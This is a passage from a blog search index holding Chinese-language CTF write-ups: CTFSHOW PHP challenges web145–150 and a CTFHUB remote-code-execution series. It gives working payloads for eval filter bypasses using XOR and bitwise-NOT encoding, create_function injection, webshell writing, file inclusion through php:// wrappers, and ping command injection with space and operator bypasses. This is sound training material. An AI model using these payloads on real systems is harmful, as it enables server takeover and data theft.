class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</code></p><ul><li><code>*</code>被过滤了，但是可以用<code>|</code></li><li>发现<code>^</code>也不能用了，不能用异或了，但是<code>~</code>可以用，所以方法为取反</li></ul><h1 id="web146-或，取反"><a href="#web146-或，取反" class="headerlink" title="web146(或，取反)"></a>web146(或，取反)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>paylod: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</code></p><ul><li>跟上题一样</li></ul><h1 id="web147-create-function"><a href="#web147-create-function" class="headerlink" title="web147(create_function)"></a>web147(create_function)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?show=&#125;system(&quot;tac flag.php&quot;);//    ctf=\create_function</code></p><ul><li>匿名函数：<code>create_function</code>（在php5.3.0 或以上才能使用）</li><li>在传参中，因为使用了匿名函数，所以需要一个<code>&#125;</code>来闭合前面的<code>&#123;</code>，在最后用注释符号将原来的<code>&#125;</code>注释掉</li></ul><h1 id="web148-异或"><a href="#web148-异或" class="headerlink" title="web148(异或)"></a>web148(异或)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?code=(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da);</code></p><ul><li>可以用<code>^</code>，所以用异或构造。</li></ul><blockquote><p>ps：感觉考的知识点并不是这个。。。</p></blockquote><h1 id="web149-file-put-contents"><a href="#web149-file-put-contents" class="headerlink" title="web149(file_put_contents)"></a>web149(file_put_contents)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: /index.php    1=system(&quot;cat /ctfshow_fl0g_here.txt&quot;);</code></p><ul><li><code>unlink</code>：删除文件</li><li>如果<code>$file</code>的名字不为<code>index.php</code>，就会被删除，而下面还有<code>file_put_contents</code>函数，提示已经很明显了</li><li>解题思路：<ul><li>先利用<code>file_put_contents</code>函数，以GET方式传<code>index.php</code>为文件名，在以POST方式传一句话木马，发现上传成功</li><li>访问<code>index.php</code>文件，就可以rce了</li></ul></li></ul><h1 id="web150"><a href="#web150" class="headerlink" title="web150()"></a>web150()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-RCE</title>
      <link href="/2023/07/26/CTFHUB-RCE/"/>
      <url>/2023/07/26/CTFHUB-RCE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现参数为cmd</p><p><code>payload：?cmd=phpinfo();</code><br>有回显，说明可以利用系统命令函数</p><p><code>payload：?cmd=system(&quot;ls /&quot;);</code><br>有回显，并且看到有关于flag的文件，读取它</p><p><code>payload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);</code><br>得到flag</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure><p>介绍一下陌生函数：</p><blockquote><p>strpos(x,y)    查看y是否在x里</p><p>include    将文件里的代码当作原来文件的代码执行</p></blockquote><p>点击shell得到一串php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要用GET传参方式传参，参数为file</p><p><code>payload：?file=shell.txt</code><br>点击shell得到php代码：<code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;</code></p><p><code>payload：以post方式传参：ctfhub=system(&quot;ls&quot;)</code><br>根据回显发现没有有关flag的文件，那就读取上级目录看看</p><p><code>payload：ctfhub=system(&quot;ls /&quot;)</code><br>根据回显发现flag</p><p><code>payload：ctfhub=system(&quot;cat /flag&quot;)</code><br>得到flag</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>打开环境发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用</p><p><code>payload：?file=php://input</code><br>根据<code>php://input</code>规则，需要POST传入数据</p><p><code>payload：&lt;?php system(&quot;ls&quot;);?&gt;</code><br>根据回显发现没有flag，查找上级目录</p><p><code>payload：&lt;?php system(&quot;ls /&quot;);?&gt;</code><br>发现flag，查看</p><p><code>payload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;</code><br>得到flag</p><h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>打开环境得到php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter</p><p><code>payload：?file=php://filter/resource=/flag</code><br>flag一下子就出来了呢</p><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>打开环境得到代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>用一下php://input吧，一下子就得到了flag呢</p><p><code>payload：&lt;?php system(&quot;cat /flag&quot;);?&gt;</code></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>根据回显得出这是一个ping IP的题目</p><p>ping一下baidu.com得到回显</p><p><code>payload：baidu.com | ls</code><br>得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧</p><p><code>payload：baidu.com | cat 31327443624755.php | base64</code><br>再解码得到flag</p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>得到flag文件，但是cat被过滤了，换个吧</p><p><code>payload：baidu.com | more flag_34911944417894.php | base64</code><br>得到加密后的flag，解码得到flag</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>发现没有东西，空格被过滤</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls</code><br>得到flag文件，查看该文件</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64</code><br>解密得到flag</p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p><code>payload：baidu.com | ls</code><br>得到flag目录</p><p><code>payload：baidu.com;cd flag_is_here;ls</code><br>得到flag文件，查看文件</p><p><code>payload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64</code><br>解码得到flag</p><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>过滤了运算符，但是<strong>;</strong>漏掉了</p><p><code>payload：baidu.com;ls</code><br>查看flag文件</p><p>base64 *.php &lt;=&gt;*,php|base64</p><p><code>payload：baidu.com;base64 flag_80902931728195.php</code></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>看完代码傻眼了，啥都被过滤了，哎~~~</p><p>看看过滤笔记再来试试看<br>可以用%0a(换行符)，但是需要在url上使用</p><p><code>payload：baidu.com%0als</code><br>得到flag目录，继续搞</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als</code><br>得到flag文件</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php</code><br>解码得到flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> CTFHUB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
